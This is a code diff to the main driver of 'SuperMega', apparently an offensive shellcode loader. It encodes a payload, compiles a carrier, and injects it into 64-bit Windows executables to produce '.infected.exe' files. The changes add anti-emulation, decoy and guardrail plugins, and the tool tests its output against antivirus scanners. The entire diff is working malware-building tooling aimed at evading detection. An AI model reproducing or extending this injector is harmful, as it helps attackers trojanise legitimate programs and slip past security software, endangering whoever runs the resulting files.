@@ -1,4 +1,3 @@
-import shutil
 import argparse
 from typing import Dict
 import os
@@ -12,19 +11,21 @@ import phases.compiler
 import phases.assembler
 import phases.injector
 from observer import observer
-from pe.pehelper import extract_code_from_exe_file_ep
+from pe.pehelper import preload_dll
 from sender import scannerDetectsBytes
 from model.project import Project, prepare_project
 from model.settings import Settings
 from model.defs import *
 from log import setup_logging
-from model.carrier import Carrier, DataReuseEntry, IatRequest
+from model.injectable import DataReuseEntry
+from utils import check_deps
 
 
 def main():
     """Argument parsing for when called from command line"""
     logger.info("Super Mega")
     config.load()
+    check_deps()
     settings = Settings()
 
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
@@ -55,12 +56,7 @@ def main():
     if args.carrier:
         settings.carrier_name = args.carrier
     if args.decoder:
-        if args.decoder == "plain_1":
-            settings.decoder_style = DecoderStyle.PLAIN_1
-        elif args.decoder == "xor_1":
-            settings.decoder_style = DecoderStyle.XOR_1
-        elif args.decoder == "xor_2":
-            settings.decoder_style = DecoderStyle.XOR_2
+        settings.decoder_style = args.decoder
     if args.inject:
         if args.carrier_invoke == "eop":
             settings.carrier_invoke_style = CarrierInvokeStyle.ChangeEntryPoint
@@ -84,6 +80,10 @@ def main():
             logger.info("Could not find: {}".format(args.inject))
             return
         settings.inject_exe_in = args.inject
+        settings.inject_exe_out = "{}{}".format(
+            settings.main_dir,
+            os.path.basename(args.inject).replace(".exe", ".injected.exe")
+        )
         settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe").replace(".dll", ".infected.dll")
 
     write_webproject("default", settings)
@@ -109,7 +109,7 @@ def start(settings: Settings) -> int:
     prepare_project(settings.project_name, settings)
 
     # Do the thing and catch the errors
-    if False:
+    if True:
         start_real(settings)
     else:
         try:
@@ -137,26 +137,37 @@ def start_real(settings: Settings):
     project.init()
 
     # CHECK if 64 bit
-    if not project.carrier.superpe.is_64():
+    if not project.injectable.superpe.is_64():
         raise Exception("Binary is not 64bit: {}".format(project.settings.inject_exe_in))
 
     logger.info("--[ Config:  {}  {}  {}  {}".format(
         project.settings.carrier_name, 
         settings.payload_location.value,
-        project.settings.decoder_style.value,
+        project.settings.decoder_style,
         project.settings.carrier_invoke_style.value))
 
-    # CREATE: Carrier C source files from template (C->C)
-    phases.templater.create_c_from_template(settings, project.payload.len)
+    logger.info("--[ Plugins: AntiEmulation={}  Decoy={}  Guardrail={}".format(
+        project.settings.plugin_antiemulation,
+        project.settings.plugin_decoy,
+        project.settings.plugin_guardrail)
+    )
 
-    # If we put the payload into .rdata
+    # FIXUP DLL Payload
+    # Prepare DLL payload for usage in dll_loader_change
+    # This needs to be done before rendering the C templates, as need
+    # the real size of the payload
+    if project.settings.carrier_name == "dll_loader_change":
+        project.payload.payload_data = preload_dll(project.payload.payload_path)
+
+    # CREATE: Carrier C source files from template (C->C)
+    phases.templater.create_c_from_template(settings, len(project.payload.payload_data))
+
     # PREPARE DataReuseEntry for usage in Compiler/AsmTextParser
-    if settings.payload_location == PayloadLocation.DATA:
-        logger.info("--[ Load payload for use in .rdata injection")
-        project.carrier.add_datareuse_fixup(DataReuseEntry("supermega_payload"))
-        entry = project.carrier.get_reusedata_fixup("supermega_payload")
-        entry.data = phases.assembler.encode_payload(
-            project.payload.payload_data, settings.decoder_style)  # encrypt
+    # So the carrier is able to find the payload
+    project.injectable.add_datareuse_fixup(DataReuseEntry("supermega_payload", in_code=True))
+    entry = project.injectable.get_reusedata_fixup("supermega_payload")
+    entry.data = phases.assembler.encode_payload(
+        project.payload.payload_data, settings.decoder_style)  # encrypt
     observer.add_code_file("payload", project.payload.payload_data)
 
     # COMPILE: Carrier to .asm (C -> ASM)
@@ -164,17 +175,14 @@ def start_real(settings: Settings):
         phases.compiler.compile(
             c_in = settings.main_c_path, 
             asm_out = settings.main_asm_path,
-            carrier = project.carrier,
+            injectable = project.injectable,
             settings = project.settings)
         
     # we have the carrier-required IAT entries in carrier.iat_requests
     # CHECK if all are available in infectable, or abort (early check)
-    functions = project.carrier.get_unresolved_iat()
-    if len(functions) != 0:
-        if settings.fix_missing_iat:
-            logger.info("--[ Fixing missing IAT entries: {}".format(", ".join(functions)))
-        else:
-            raise Exception("IAT entry not found: {}".format(", ".join(functions)))
+    functions = project.injectable.get_unresolved_iat()
+    if len(functions) != 0 and settings.fix_missing_iat == False:
+        raise Exception("IAT entry not found: {}".format(", ".join(functions)))
 
     # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
     if settings.generate_shc_from_asm:
@@ -183,29 +191,14 @@ def start_real(settings: Settings):
             build_exe = settings.main_exe_path)
         observer.add_code_file("carrier_shc", carrier_shellcode)
 
-    # MERGE: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
-    if settings.payload_location == PayloadLocation.CODE:
-        logger.info("--[ Merge carrier with payload for .text injection".format())
-        full_shellcode = phases.assembler.merge_loader_payload(
-            shellcode_in = carrier_shellcode,
-            payload_data = project.payload.payload_data, 
-            decoder_style = settings.decoder_style)
-        #observer.add_code_file("full_shc", full_shellcode)
-    else:
-        # shellcode is in .rdata, so we dont need to merge
-        full_shellcode = carrier_shellcode
-
-    # RWX Injection (optional): obfuscate loader+payload
-    #if project.exe_host.rwx_section != None:
-    #    logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
-    #        project.exe_host.rwx_section.Name.decode().rstrip('\x00')
-    #    ))
-    #    obfuscate_shc_loader(settings.main_shc_path, settings.main_shc_path + ".sgn")
-    #    observer.add_code_file("payload_sgn", file_readall_binary(settings.main_shc_path + ".sgn"))
-    #    shutil.move(settings.main_shc_path + ".sgn", settings.main_shc_path)
-
-    # inject (merged) loader into an exe. Big task.
-    phases.injector.inject_exe(full_shellcode, settings, project.carrier)
+    # INJECT loader into an exe and do IAT & data references. Big task.
+    injector = phases.injector.Injector(
+        carrier_shellcode,
+        project.payload,
+        project.injectable,
+        settings)
+         
+    injector.inject_exe()
     #observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))
 
     # Check binary with avred
